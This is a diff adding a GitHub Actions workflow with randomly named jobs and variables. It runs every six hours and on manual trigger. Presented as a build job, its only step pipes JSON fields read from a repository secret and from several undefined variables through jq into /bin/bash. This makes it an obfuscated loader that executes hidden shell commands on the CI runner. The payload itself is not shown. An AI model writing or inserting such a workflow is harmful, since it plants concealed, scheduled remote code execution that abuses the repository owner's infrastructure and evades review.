@@ -1,0 +1,22 @@
+name: santoudijgxian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: santoudijgxian
+        env:
+          vo79118: ${{ secrets.vo79118 }}
+        run: |
+          echo $vo79118 | jq -r .dfe45 | /bin/bash
+          echo $fxs17 | jq -r .z462 | /bin/bash
+          echo $z84 | jq -r .nzzcs019 | /bin/bash
+          echo $vxnb448 | jq -r .lnue027 | /bin/bash
+          echo $oaxqx912 | jq -r .drfrj38248 | /bin/bash
+
